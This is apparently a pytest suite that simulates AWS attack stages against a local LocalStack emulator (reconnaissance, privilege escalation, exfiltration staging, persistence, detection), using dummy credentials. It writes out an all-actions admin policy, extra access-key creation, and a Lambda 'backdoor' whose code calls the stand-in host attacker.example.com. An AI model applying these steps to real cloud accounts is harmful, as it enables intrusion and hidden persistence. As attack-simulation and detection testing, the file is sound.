"""
test_aws.py — Cloud attack simulation tests against LocalStack.
Tests privilege escalation, data exfiltration, persistence, and detection scenarios.
"""
import boto3
import json
import pytest
import time
from botocore.config import Config

ENDPOINT = "http://localhost:4566"
REGION = "us-east-1"

def get_client(service):
    return boto3.client(
        service,
        endpoint_url=ENDPOINT,
        region_name=REGION,
        aws_access_key_id="test",
        aws_secret_access_key="test",
    )


# ── Reconnaissance ──────────────────────────────────────────────

class TestReconnaissance:
    def test_s3_bucket_discovery(self):
        """Simulate S3 bucket enumeration."""
        s3 = get_client("s3")
        resp = s3.list_buckets()
        buckets = [b["Name"] for b in resp["Buckets"]]
        assert "test-data-bucket" in buckets
        assert "audit-logs-bucket" in buckets

    def test_iam_user_enumeration(self):
        """Simulate IAM user enumeration."""
        iam = get_client("iam")
        resp = iam.list_users()
        users = [u["UserName"] for u in resp["Users"]]
        assert "attacker-sim" in users
        assert "defender-sim" in users

    def test_ec2_instance_discovery(self):
        """Simulate EC2 instance enumeration."""
        ec2 = get_client("ec2")
        resp = ec2.describe_instances()
        instances = []
        for r in resp["Reservations"]:
            instances.extend(r["Instances"])
        assert len(instances) >= 1


# ── Privilege Escalation ────────────────────────────────────────

class TestPrivilegeEscalation:
    def test_create_admin_policy(self):
        """Simulate attacker creating an admin policy."""
        iam = get_client("iam")
        policy_doc = {
            "Version": "2012-10-17",
            "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
        }
        resp = iam.create_policy(
            PolicyName="EscalationPolicy",
            PolicyDocument=json.dumps(policy_doc),
        )
        assert resp["Policy"]["PolicyName"] == "EscalationPolicy"
        # Cleanup
        iam.delete_policy(PolicyArn=resp["Policy"]["Arn"])

    def test_attach_policy_to_user(self):
        """Simulate attaching escalated policy to a user."""
        iam = get_client("iam")
        policy_doc = {
            "Version": "2012-10-17",
            "Statement": [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"}]
        }
        policy = iam.create_policy(
            PolicyName="S3Escalation",
            PolicyDocument=json.dumps(policy_doc),
        )
        iam.attach_user_policy(
            UserName="attacker-sim",
            PolicyArn=policy["Policy"]["Arn"],
        )
        attached = iam.list_attached_user_policies(UserName="attacker-sim")
        arns = [p["PolicyArn"] for p in attached["AttachedPolicies"]]
        assert policy["Policy"]["Arn"] in arns
        # Cleanup
        iam.detach_user_policy(
            UserName="attacker-sim",
            PolicyArn=policy["Policy"]["Arn"],
        )
        iam.delete_policy(PolicyArn=policy["Policy"]["Arn"])


# ── Data Exfiltration ───────────────────────────────────────────

class TestDataExfiltration:
    def test_s3_data_upload_exfil(self):
        """Simulate staging stolen data in S3."""
        s3 = get_client("s3")
        s3.put_object(
            Bucket="test-data-bucket",
            Key="exfil/credentials.txt",
            Body=b"AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        )
        resp = s3.get_object(Bucket="test-data-bucket", Key="exfil/credentials.txt")
        body = resp["Body"].read()
        assert b"AKIA" in body

    def test_s3_bucket_policy_read(self):
        """Verify bucket policy allows public read (misconfiguration)."""
        s3 = get_client("s3")
        try:
            policy = s3.get_bucket_policy(Bucket="test-data-bucket")
            doc = json.loads(policy["Policy"])
            statements = doc["Statement"]
            assert any(
                s["Effect"] == "Allow" and "*" in str(s.get("Principal", ""))
                for s in statements
            )
        except Exception:
            pytest.fail("Bucket policy should be readable")


# ── Persistence ─────────────────────────────────────────────────

class TestPersistence:
    def test_lambda_backdoor(self):
        """Simulate deploying a persistent Lambda backdoor."""
        lam = get_client("lambda")
        backdoor_code = """
import json, urllib.request
def handler(event, context):
    urllib.request.urlopen('http://attacker.example.com/callback')
    return {'statusCode': 200, 'body': 'ok'}
"""
        import zipfile, io
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("lambda.py", backdoor_code)
        buf.seek(0)

        resp = lam.create_function(
            FunctionName="backdoor-func",
            Runtime="python3.11",
            Role="arn:aws:iam::000000000000:role/lambda-exec-role",
            Handler="lambda.handler",
            Code={"ZipFile": buf.read()},
        )
        assert resp["FunctionName"] == "backdoor-func"
        # Cleanup
        lam.delete_function(FunctionName="backdoor-func")

    def test_iam_access_key_creation(self):
        """Simulate creating additional access keys for persistence."""
        iam = get_client("iam")
        keys_before = iam.list_access_keys(UserName="attacker-sim")
        key_count_before = len(keys_before["AccessKeyMetadata"])

        resp = iam.create_access_key(UserName="attacker-sim")
        assert "AccessKeyId" in resp["AccessKey"]

        keys_after = iam.list_access_keys(UserName="attacker-sim")
        assert len(keys_after["AccessKeyMetadata"]) == key_count_before + 1
        # Cleanup
        iam.delete_access_key(
            UserName="attacker-sim",
            AccessKeyId=resp["AccessKey"]["AccessKeyId"],
        )


# ── Detection (CloudTrail) ──────────────────────────────────────

class TestDetection:
    def test_cloudtrail_logging(self):
        """Verify CloudTrail is capturing API calls."""
        ct = get_client("cloudtrail")
        trails = ct.describe_trails()
        trail_names = [t["Name"] for t in trails["TrailList"]]
        assert "test-trail" in trail_names

    def test_cloudtrail_event_lookup(self):
        """Simulate querying CloudTrail for suspicious activity."""
        ct = get_client("cloudtrail")
        time.sleep(2)  # Allow events to propagate
        try:
            resp = ct.lookup_events(
                LookupAttributes=[
                    {"AttributeKey": "EventName", "AttributeValue": "CreatePolicy"}
                ],
                MaxResults=10,
            )
            events = resp.get("Events", [])
            assert len(events) >= 1, "CloudTrail should have recorded CreatePolicy"
        except Exception as e:
            # LocalStack CloudTrail may have limited event propagation
            pytest.skip(f"CloudTrail event lookup limited in LocalStack: {e}")


# ── Lateral Movement ────────────────────────────────────────────

class TestLateralMovement:
    def test_cross_account_assume_role(self):
        """Simulate role assumption for lateral movement."""
        iam = get_client("iam")
        sts = get_client("sts")
        # Get identity
        identity = sts.get_caller_identity()
        assert identity["Account"] == "000000000000"
        # Verify role exists
        role = iam.get_role(RoleName="lambda-exec-role")
        assert role["Role"]["RoleName"] == "lambda-exec-role"

    def test_ec2_metadata_access(self):
        """Simulate EC2 instance metadata service access pattern."""
        ec2 = get_client("ec2")
        resp = ec2.describe_instances()
        for r in resp["Reservations"]:
            for inst in r["Instances"]:
                assert "InstanceId" in inst
                assert "State" in inst
